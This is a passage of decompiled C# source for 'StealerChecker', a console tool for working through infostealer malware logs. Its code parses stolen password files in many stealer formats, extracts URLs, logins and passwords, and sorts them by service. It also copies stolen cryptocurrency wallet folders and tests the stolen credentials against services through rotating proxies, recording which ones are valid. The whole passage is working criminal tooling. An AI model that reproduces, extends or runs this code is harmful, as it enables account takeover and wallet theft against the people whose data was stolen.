      catch (UnauthorizedAccessException ex)
      {
        Colorful.Console.WriteLine("Отсутствует доступ. Ошибка: " + ex.Message);
      }
      catch (Exception ex)
      {
        Colorful.Console.WriteLine("Произошла ошибка. Обратитесь к разрабу. Ошибка: " + ex.Message);
      }
    }

    internal static void SetStatus(string status) => Colorful.Console.Title = "StealerChecker v9.3 by Temnij | " + status;

    internal static void SetStatus() => Colorful.Console.Title = "StealerChecker v9.3 by Temnij";

    internal static void SortLogsbyCategories()
    {
      Program.SetStatus("Loading...");
      List<Program.Service> services = new List<Program.Service>();
      services.AddRange(((IEnumerable<string>) Directory.GetFiles("services")).Select<string, Program.Service>((Func<string, Program.Service>) (x => new Program.Service()
      {
        Name = Path.GetFileNameWithoutExtension(x),
        Services = (IEnumerable<string>) System.IO.File.ReadAllLines(x)
      })));
      Program.ProcessServiceNew(services);
      Program.SetStatus();
    }

    internal static IEnumerable<Program.Password> GetPasswords()
    {
      List<Program.Password> source1 = new List<Program.Password>();
      Program.SetStatus(string.Format("Loading [1/2]... {0}%... Processing...", (object) Program.progress));
      int count = Program.files.Count;
      int a = 0;
      foreach (Log log in Program.files.Shuffle<Log>().ToArray<Log>())
      {
        Log filePas = log;
        try
        {
          if (a > 10)
          {
            if (a % 10 == 0)
              Program.SetStatus(string.Format("Loading [2/2]... {0}%... Processing...", (object) Math.Round(Program.GetPercent(count, a), 1)));
          }
        }
        catch
        {
        }
        string path1_1 = FileCl.Load(filePas.FullPath).Info.Directory?.FullName ?? "";
        string name = filePas.Name;
        // ISSUE: reference to a compiler-generated method
        switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(name))
        {
          case 248754701:
            if (name == "InfoHERE.txt")
              break;
            goto default;
          case 1723283463:
            if (name == "system_info.txt")
            {
              try
              {
                MatchCollection source2 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "passwords.txt")).Replace("\r", ""), "Site: (.*)\\s*Username: (.*)\\s*Password: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source2.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 1818431023:
            if (name == "LogInfo.txt")
            {
              try
              {
                MatchCollection source3 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "General", "passwords.txt")).Replace("\r", ""), "Url: (.*)\\s*Login: (.*)\\s*Password: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source3.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 1847820178:
            if (name == "UserInformation.txt")
            {
              try
              {
                MatchCollection source4 = Regex.Matches(FileCl.Load(Path.Combine(path1_1, "Passwords.txt")).GetContent().Replace("\r", ""), "URL: (.*)\\s*Username: (.*)\\s*Password: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source4.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 1893922270:
            if (name == "System Info.txt")
            {
              try
              {
                MatchCollection source5 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "Passwords.txt")).Replace("\r", ""), "HOST: (.*)\\s*USER: (.*)\\s*PASS: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source5.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 2523777857:
            if (name == "readme.txt")
            {
              try
              {
                MatchCollection source6 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "Browsers", "Passwords.txt")).Replace("\r", ""), "\\| Site: (.*)\\s*\\| Login: (.*)\\s*\\| Password: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source6.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 2581122662:
            if (name == "_Information.txt")
            {
              try
              {
                MatchCollection source7 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "_AllPasswords_list.txt")).Replace("\r", ""), "Url: (.*)\\s*Username: (.*)\\s*Password: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source7.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 2762029587:
            if (name == "information.txt")
            {
              try
              {
                MatchCollection source8 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "Browser", "Passwords.txt")).Replace("\r", ""), "\\| Site: (.*)\\s*\\| Login: (.*)\\s*\\| Pass: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source8.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
              }
              catch
              {
              }
              try
              {
                MatchCollection source9 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_1, "passwords.txt")).Replace("\r", ""), "Host: (.*)\\s*Login: (.*)\\s*Password: (.*)");
                source1.AddRange((IEnumerable<Program.Password>) source9.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                goto default;
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          case 2984072290:
            if (name == "InfoHERE.html")
              break;
            goto default;
          case 3847290556:
            if (name == "~Work.log")
            {
              try
              {
                List<string> list = ((IEnumerable<string>) Directory.GetFiles(Path.Combine(path1_1, "Browsers"))).Where<string>((Func<string, bool>) (x => Path.GetFileName(x).StartsWith("Passwords"))).ToList<string>();
                if (Directory.Exists(Path.Combine(path1_1, "Browsers", "Unknowns")))
                  list.AddRange(((IEnumerable<string>) Directory.GetFiles(Path.Combine(path1_1, "Browsers", "Unknowns"))).Where<string>((Func<string, bool>) (x => Path.GetFileName(x).StartsWith("Passwords"))));
                using (IEnumerator<MatchCollection> enumerator = list.AsParallel<string>().Select<string, MatchCollection>((Func<string, MatchCollection>) (filename => Regex.Matches(System.IO.File.ReadAllText(filename).Replace("\r", ""), "URL: (.*)\\s*Login: (.*)\\s*Password: (.*)"))).GetEnumerator())
                {
                  while (enumerator.MoveNext())
                  {
                    MatchCollection current = enumerator.Current;
                    source1.AddRange((IEnumerable<Program.Password>) current.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
                  }
                  goto default;
                }
              }
              catch
              {
                goto default;
              }
            }
            else
              goto default;
          default:
label_59:
            ++a;
            continue;
        }
        string path1_2 = Path.Combine(path1_1, "Browsers", "Passwords");
        if (System.IO.File.Exists(Path.Combine(path1_2, "ChromiumV2.txt")))
        {
          try
          {
            MatchCollection source10 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_2, "ChromiumV2.txt")).Replace("\r", ""), "Url: (.*)\\s*Username: (.*)\\s*Password: (.*)\\s*Application: (.*)");
            Log pas = filePas;
            source1.AddRange(source10.OfType<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, pas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
          }
          catch
          {
          }
        }
        if (System.IO.File.Exists(Path.Combine(path1_2, "Passwords_Google.txt")))
        {
          try
          {
            MatchCollection source11 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_2, "Passwords_Google.txt")).Replace("\r", ""), "Url: (.*)\\s*Login: (.*)\\s*Password: (.*)\\s*Browser: (.*)");
            source1.AddRange((IEnumerable<Program.Password>) source11.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
          }
          catch
          {
          }
        }
        if (System.IO.File.Exists(Path.Combine(path1_2, "Passwords_Mozilla.txt")))
        {
          try
          {
            MatchCollection source12 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_2, "Passwords_Mozilla.txt")).Replace("\r", ""), "URL : (.*)\\s*Login: (.*)\\s*Password: (.*)");
            source1.AddRange((IEnumerable<Program.Password>) source12.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
          }
          catch
          {
          }
        }
        if (System.IO.File.Exists(Path.Combine(path1_2, "Passwords_Opera.txt")))
        {
          try
          {
            MatchCollection source13 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_2, "Passwords_Opera.txt")).Replace("\r", ""), "Url: (.*)\\s*Login: (.*)\\s*Passwords: (.*)");
            source1.AddRange((IEnumerable<Program.Password>) source13.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
          }
          catch
          {
          }
        }
        if (System.IO.File.Exists(Path.Combine(path1_2, "Passwords_Unknown.txt")))
        {
          try
          {
            MatchCollection source14 = Regex.Matches(System.IO.File.ReadAllText(Path.Combine(path1_2, "Passwords_Unknown.txt")).Replace("\r", ""), "Url: (.*)\\s*Login: (.*)\\s*Password: (.*)");
            source1.AddRange((IEnumerable<Program.Password>) source14.OfType<Match>().AsParallel<Match>().Select<Match, Program.Password>((Func<Match, Program.Password>) (match => new Program.Password(match.Groups[1].Value, match.Groups[2].Value, match.Groups[3].Value, filePas))).Where<Program.Password>((Func<Program.Password, bool>) (password => password.Login.Length > 2 && password.Pass.Length > 2)));
            goto label_59;
          }
          catch
          {
            goto label_59;
          }
        }
        else
          goto label_59;
      }
      return source1.Distinct<Program.Password>();
    }

    internal static void ProcessServiceNew(List<Program.Service> services)
    {
      Colorful.Console.WriteLine("Please, wait...", Color.Cyan);
      int max = services.Count + services.Sum<Program.Service>((Func<Program.Service, int>) (x => x.Services.Count<string>()));
      int count = 0;
      foreach (Program.Service service1 in services)
      {
        string categoryName = Path.Combine("Categories", service1.Name);
        if (!Directory.Exists(categoryName))
          Directory.CreateDirectory(categoryName);
        List<Task> list = service1.Services.AsParallel<string>().Select<string, Task>((Func<string, Task>) (service => new Task((Action) (() =>
        {
          Program.SetStatus(string.Format("Working... {0}%", (object) Math.Round(Program.GetPercent(max, count), 1)));
          ParallelQuery<string> parallelQuery = Program.SearchByURLHelper(service);
          if (parallelQuery.Any<string>())
            System.IO.File.WriteAllLines(Path.Combine(categoryName, service + ".txt"), (IEnumerable<string>) parallelQuery);
          ++count;
        })))).ToList<Task>();
        foreach (Task task in list)
          task.RunSynchronously();
        foreach (Task task in list)
          task.Wait();
        count++;
      }
      Program.SetStatus();
    }

    internal static async Task GetFilesAsync()
    {
      List<string> pathsAsync = await Program.GetPathsAsync(Program.patterns);
      Program.files.AddRange((IEnumerable<Log>) pathsAsync.AsParallel<string>().Select<string, Log>((Func<string, Log>) (x => new Log(x))).Where<Log>((Func<Log, bool>) (x => Program.patterns.Contains(x.Name))).Distinct<Log>());
      if (Program.files.Count != 0)
        return;
      Colorful.Console.WriteLine("Seems, there is an Everything error.. Using normal method", Color.Pink);
      Program.SetStatus("Adding Directories...");
      Program.AddDirectories();
      Colorful.Console.WriteLine(string.Format("Directories added: {0}", (object) Program.directories.Count), Color.Gray);
      Program.SetStatus("Adding files...");
      Program.AddFiles();
      Colorful.Console.WriteLine(string.Format("Files added: {0}", (object) Program.files.Count), Color.Gray);
      Program.SetStatus();
    }

    internal static async Task<List<string>> GetPathsAsync(List<string> patterns)
    {
      List<string> pathsResult = new List<string>();
      EverythingClient client = new EverythingClient();
      string[] strArray;
      int index;
      List<string> stringList;
      if (!Program.opt.All)
      {
        strArray = patterns.ToArray();
        for (index = 0; index < strArray.Length; ++index)
        {
          string str = strArray[index];
          Program.SetStatus(string.Format("Loading [1/2]... {0}%", (object) Math.Round(Program.GetPercent(patterns.Count, Program.progress++), 2)));
          stringList = pathsResult;
          stringList.AddRange((IEnumerable<string>) (await client.SearchAsync("\"" + str + "\"", (SearchOptions) null, new CancellationToken())).Items.OfType<FileResultItem>().AsParallel<FileResultItem>().Where<FileResultItem>((Func<FileResultItem, bool>) (file => file.FullPath.StartsWith(Program.opt.Path.Replace("/", "\\"), StringComparison.OrdinalIgnoreCase))).Select<FileResultItem, string>((Func<FileResultItem, string>) (x => x.FullPath)));
          stringList = (List<string>) null;
        }
        strArray = (string[]) null;
      }
      else
      {
        strArray = patterns.ToArray();
        for (index = 0; index < strArray.Length; ++index)
        {
          string str = strArray[index];
          Program.SetStatus(string.Format("Loading [1/2]... {0}%", (object) Math.Round(Program.GetPercent(patterns.Count, Program.progress++), 2)));
          stringList = pathsResult;
          stringList.AddRange((await client.SearchAsync("\"" + str + "\"", (SearchOptions) null, new CancellationToken())).Items.OfType<FileResultItem>().Select<FileResultItem, string>((Func<FileResultItem, string>) (x => x.FullPath)));
          stringList = (List<string>) null;
        }
        strArray = (string[]) null;
      }
      List<string> pathsAsync = pathsResult;
      pathsResult = (List<string>) null;
      client = (EverythingClient) null;
      return pathsAsync;
    }

    internal static void PrintAnalysisMenu()
    {
      int num;
      do
      {
        Colorful.Console.Clear();
        Colorful.Console.WriteLine("Analysis", Color.Pink);
        Colorful.Console.WriteLine();
        Colorful.Console.Write("1. Total Passwords - ", Color.LightCyan);
        Colorful.Console.WriteLine(Program.glob.Count<Program.Password>(), Color.DarkCyan);
        Colorful.Console.Write("2. Username in the password - ", Color.LightCyan);
        Colorful.Console.WriteLine(string.Format("~{0}%", (object) Program.AnalyzeLoginInPass()), Color.DarkCyan);
        Colorful.Console.Write("3. Username = password - ", Color.LightCyan);
        Colorful.Console.WriteLine(string.Format("~{0}%", (object) Program.AnalyzeLoginEqualsPass()), Color.DarkCyan);
        Colorful.Console.WriteLine("4. Most popular URLs:", Color.LightCyan);
        Colorful.Console.WriteLine(Program.AnalyzeMostPopularURLs(), Color.DarkCyan);
        Colorful.Console.WriteLine();
        Colorful.Console.WriteLine("5. Types of logs:", Color.LightCyan);
        Colorful.Console.WriteLine(Program.AnalyzeTypesOfLogs().Join(), Color.DarkCyan);
        Colorful.Console.WriteLine("55. back <--", Color.Cyan);
        num = 0;
        try
        {
          num = int.Parse(Colorful.Console.ReadLine());
        }
        catch
        {
          Colorful.Console.Clear();
          Program.PrintAnalysisMenu();
        }
        Colorful.Console.WriteLine();
      }
      while (num != 55);
      Colorful.Console.Clear();
      Program.PrintMainMenu();
    }

    internal static void PrintMainMenu()
    {
      while (true)
      {
        Colorful.Console.WriteLine();
        Colorful.Console.WriteAscii("StealerChecker", Color.Pink);
        Colorful.Console.WriteLine("StealerChecker v9.3 by Temnij", Color.Pink);
        Colorful.Console.WriteLine(string.Format("Loaded: {0} logs", (object) Program.files.Count), Color.Gray);
        Colorful.Console.WriteLine();
        Colorful.Console.WriteLine("1. Get", Color.LightCyan);
        Colorful.Console.WriteLine("2. Search", Color.LightCyan);
        Colorful.Console.WriteLine("3. Sort Logs", Color.LightCyan);
        Colorful.Console.WriteLine("4. Analysis", Color.LightCyan);
        Colorful.Console.WriteLine();
        Colorful.Console.WriteLine(string.Format("88. Verbose: {0}", (object) Program.opt.Verbose), Color.Cyan);
        Colorful.Console.WriteLine("99. Exit", Color.LightPink);
        int num = 0;
        try
        {
          num = int.Parse(Colorful.Console.ReadLine());
        }
        catch
        {
          Colorful.Console.Clear();
          Program.PrintMainMenu();
        }
        switch (num)
        {
          case 1:
            goto label_4;
          case 2:
            goto label_5;
          case 3:
            goto label_6;
          case 4:
            goto label_7;
          case 5:
            goto label_8;
          case 88:
            goto label_9;
          case 99:
            goto label_10;
          default:
            Colorful.Console.Clear();
            continue;
        }
      }
label_4:
      Program.GetMenu.Print();
      return;
label_5:
      Program.SearchMenu.Print();
      return;
label_6:
      Program.SortMenu.Print();
      return;
label_7:
      Program.PrintAnalysisMenu();
      return;
label_8:
      Program.CheckersMenu.Print();
      return;
label_9:
      Program.opt.Verbose = !Program.opt.Verbose;
      Colorful.Console.Clear();
      return;
label_10:
      Environment.Exit(0);
    }

    internal static string AnalyzeMostPopularURLs()
    {
      StringBuilder builder = new StringBuilder();
      foreach (var data in Program.glob.GroupBy<Program.Password, string>((Func<Program.Password, string>) (x => x.Url)).AsParallel<IGrouping<string, Program.Password>>().Select(group => new
      {
        Key = group.Key,
        Count = group.Count<Program.Password>()
      }).Distinct().Where(x => !string.IsNullOrEmpty(x.Key)).OrderByDescending(x => x.Count).Take(3))
      {
        if (data.Key.Length > 3)
          builder.WriteLine(string.Format("\t{0} - {1}% ({2} accounts)", (object) data.Key, (object) Math.Round(Program.GetPercent(Program.glob.Count<Program.Password>(), data.Count), 2), (object) data.Count));
      }
      return builder.ToString();
    }

    internal static Decimal AnalyzeLoginInPass()
    {
      int a = Program.glob.Count<Program.Password>((Func<Program.Password, bool>) (x => x.Pass.IndexOf(x.Login, StringComparison.OrdinalIgnoreCase) >= 0));
      return Math.Round(Program.GetPercent(Program.glob.Count<Program.Password>(), a), 2);
    }

    internal static Decimal AnalyzeLoginEqualsPass()
    {
      int a = Program.glob.Count<Program.Password>((Func<Program.Password, bool>) (x => x.Pass.Equals(x.Login, StringComparison.OrdinalIgnoreCase)));
      return Math.Round(Program.GetPercent(Program.glob.Count<Program.Password>(), a), 2);
    }

    private static IEnumerable<string> AnalyzeTypesOfLogs()
    {
      List<KeyValuePair<string, int>> source = new List<KeyValuePair<string, int>>();
      for (int index = 0; index < Program.patterns.Count; ++index)
      {
        string pattern = Program.patterns[index];
        string name = Program.names[index];
        int num = Program.files.Count<Log>((Func<Log, bool>) (x => x.Name.Equals(pattern)));
        if (num > 0)
          source.Add(new KeyValuePair<string, int>(name, num));
      }
      return source.OrderByDescending<KeyValuePair<string, int>, int>((Func<KeyValuePair<string, int>, int>) (x => x.Value)).Select<KeyValuePair<string, int>, string>((Func<KeyValuePair<string, int>, string>) (x => string.Format("\t{0} - {1} logs", (object) x.Key, (object) x.Value)));
    }

    internal static Decimal GetPercent(int b, int a, Decimal c = 100M) => b == 0 ? 0M : (Decimal) a / ((Decimal) b / c);

    private static void GetAllWallets() => Program.wallets.ForEach(new Action<string>(Program.GetSpecWallets));

    private static void GetSpecWallets(string WalletName)
    {
      try
      {
        Task.Run((Action) (() =>
        {
          ParallelQuery<string> source = Program.files.AsParallel<Log>().Where<Log>((Func<Log, bool>) (file => Directory.Exists(Path.Combine(new FileInfo(file.FullPath).Directory?.FullName ?? string.Empty, "Wallets", WalletName)))).Select<Log, string>((Func<Log, string>) (file => new FileInfo(file.FullPath).Directory?.FullName));
          if (!Directory.Exists(Path.Combine("Wallets", WalletName)))
            Directory.CreateDirectory(Path.Combine("Wallets", WalletName));
          int counterA = 0;
          List<string> folders = source.ToList<string>();
          foreach (string str in folders)
          {
            string walletFolder = str;
            Task.Run((Action) (() =>
            {
              try
              {
                Program.SetStatus(string.Format("Working... [{0}] [{1}/{2}]", (object) WalletName, (object) counterA, (object) folders.Count));
                Program.CopyFiles(walletFolder, Path.Combine("Wallets", WalletName, new DirectoryInfo(walletFolder).Name));
                ++counterA;
              }
              catch
              {
              }
            }));
          }
          Colorful.Console.WriteLine("Sucsess [" + WalletName + "]!", Color.LightGreen);
          Program.SetStatus();
        }));
      }
      catch
      {
      }
    }

    public static void Check(IChecker checker)
    {
      if (!Directory.Exists("Checked"))
        Directory.CreateDirectory("Checked");
      ParallelQuery<string> source = Program.SearchByURLHelper(checker.Service);
      int index = 0;
      List<Thread> list = source.Shuffle<string>().Select<string, Thread>((Func<string, Thread>) (password => new Thread((ThreadStart) (() =>
      {
        while (true)
        {
          try
          {
            if (index >= Program.proxy.Count)
              index = 0;
            string result;
            bool isValid;
            checker.ProcessLine(password, Program.proxy[index++], Program.type, out result, out isValid);
            System.IO.File.AppendAllText(Path.Combine("Checked", checker.Service + ".txt"), password + " - " + (isValid ? "Valid" : "Not valid") + ", info: " + result + Program.NewLine);
            break;
          }
          catch
          {
          }
        }
      })))).ToList<Thread>();
      foreach (Thread thread in list)
        thread.Start();
      for (int index1 = 0; index1 < list.Count; ++index1)
      {
        Program.SetStatus(string.Format("Checking by {0}, {1}%", (object) checker.Service, (object) Convert.ToInt32(Math.Round(Program.GetPercent(list.Count, index1), 1))));
        if (!list[index1].IsAlive)
          list[index1].Wait();
      }
    }

    private static void CheckAll()
    {
      foreach (IChecker checker in Program.checkers)
      {
        Colorful.Console.WriteLine("Checking " + checker.Service);
        Program.Check(checker);
      }
    }

    private static void SetProxy()
    {
      Colorful.Console.WriteLine("First, set proxy type:", Color.Pink);
      Colorful.Console.WriteLine();
      Colorful.Console.WriteLine("1) Socks5", Color.LightCyan);
      Colorful.Console.WriteLine("2) Socks4", Color.LightCyan);
      Colorful.Console.WriteLine("3) HTTP/s", Color.LightCyan);
      int num = 0;
      try
      {
        num = int.Parse(Colorful.Console.ReadLine());
      }
      catch
      {
        Colorful.Console.Clear();
        Program.PrintMainMenu();
      }
      switch (num)
      {
        case 1:
          Program.type = ProxyType.Socks5;
          break;
        case 2:
          Program.type = ProxyType.Socks4;
          break;
        case 3:
          Program.type = ProxyType.HTTP;
          break;
        default:
          Colorful.Console.Clear();
          Program.SetProxy();
          break;
      }
      while (true)
      {
        Colorful.Console.WriteLine("Second, set proxylist file:", Color.Pink);
        Colorful.Console.WriteLine();
        try
        {
          Program.proxy = ((IEnumerable<string>) System.IO.File.ReadAllLines(Colorful.Console.ReadLine())).ToList<string>();
          break;
        }
        catch
        {
          Colorful.Console.Clear();
        }
      }
    }

    private static string GetHash(string path) => FileCl.Load(path).Hashes.GetCRC32();

    public static IEnumerable<KeyValuePair<string, string>> GetAllHashes()
    {
      List<KeyValuePair<string, string>> list = new List<KeyValuePair<string, string>>();
      int y = 0;
      List<Thread> threadList = Program.files.ConvertAll<Thread>((Converter<Log, Thread>) (file => new Thread((ThreadStart) (() =>
      {
        Program.SetStatus(string.Format("Getting hashes... {0}%", (object) Math.Round(Program.GetPercent(Program.files.Count, y++), 3)));
        try
        {
          list.Add(new KeyValuePair<string, string>(file.Name, Program.GetHash(file.FullPath)));
        }
        catch
        {
        }
      }))));
      foreach (Thread thread in threadList)
        thread.Start();
      int num = 0;
      foreach (Thread th in threadList)
      {
        Program.SetStatus(string.Format("Waiting... {0}%", (object) Math.Round(Program.GetPercent(threadList.Count, num++), 3)));
        th.Wait();
      }
      return (IEnumerable<KeyValuePair<string, string>>) list;
    }

    public struct Menu
    {
      public List<KeyValuePair<string, Action>> menu;
      public string Name;
    }

    public class Password
    {
      public string Login;
      public string Pass;
      public Log stealer;
      public string Url;

      public Password(string url, string login, string pass, Log log)
      {
        this.Url = url;
        this.Login = login;
        this.Pass = pass;
        this.stealer = log;
      }
    }

    public class Options
    {
      [Option('p', "path", HelpText = "Path to folder with logs", Required = true)]
      public string Path { get; set; }

      [Option('v', "verbose", HelpText = "Passwords view verbose mode", Required = false)]
      public bool Verbose { get; set; }

      [Option('e', "everything", HelpText = "Use Everything service", Required = false)]
      public bool Everything { get; set; }

      [Option('a', "all", HelpText = "Search all logs", Hidden = true, Required = false)]
      public bool All { get; set; }
    }

    internal struct Service
    {
      public string Name;
      public IEnumerable<string> Services;
    }
  }
}
